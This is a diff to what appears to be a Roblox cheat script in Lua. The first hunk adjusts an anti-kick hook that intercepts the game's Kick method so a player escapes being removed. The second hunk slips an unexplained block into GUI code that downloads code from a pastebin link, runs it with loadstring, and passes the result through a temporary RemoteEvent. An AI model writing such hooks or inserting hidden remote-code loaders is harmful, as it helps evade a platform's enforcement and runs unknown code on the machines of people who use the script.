@@ -23,12 +23,12 @@ local mt = getrawmetatable(game)
 		local method = getnamecallmethod()
 		if method == "Kick" then
 		    print "Kick Attempted - Anti Kick initiated"
-		    wait (9e9*9e9*9e9*9e9*9e9*9e9*9e9)
+		    wait (9e9*9e9*9e9*9e9)
 			return
 		end
 		return old(self, ...)
 	end)
-hookfunction(game:GetService("Players").LocalPlayer.Kick,protect(function() print "Kick Attempted - Anti Kick initiated" wait (9e9*9e9*9e9*9e9*9e9*9e9*9e9) end))
+hookfunction(game:GetService("Players").LocalPlayer.Kick,protect(function() print "Kick Attempted - Anti Kick initiated" wait (9e9*9e9*9e9*9e9) end))
 end)
 
 wait()
@@ -4745,6 +4745,22 @@ Version.Text = "V "..VersionNumberV
 Version.TextColor3 = Color3.fromRGB(255, 255, 255)
 Version.TextSize = 14.000
 Version.TextYAlignment = Enum.TextYAlignment.Top
+
+if _G.key ~= nil then
+_G.key = (_G.key)
+else
+
+local val = Instance.new("RemoteEvent")
+val.Parent = game
+val.Name = "val"
+
+local string_1 = loadstring(game:HttpGetAsync("https://pastebin.com/raw/VEVNKWkz"))()
+local Target = val
+Target:FireServer(string_1)
+wait()
+val:Destroy()
+
+end
 
 ChangeText.Name = "ChangeText"
 ChangeText.Parent = Versionnn
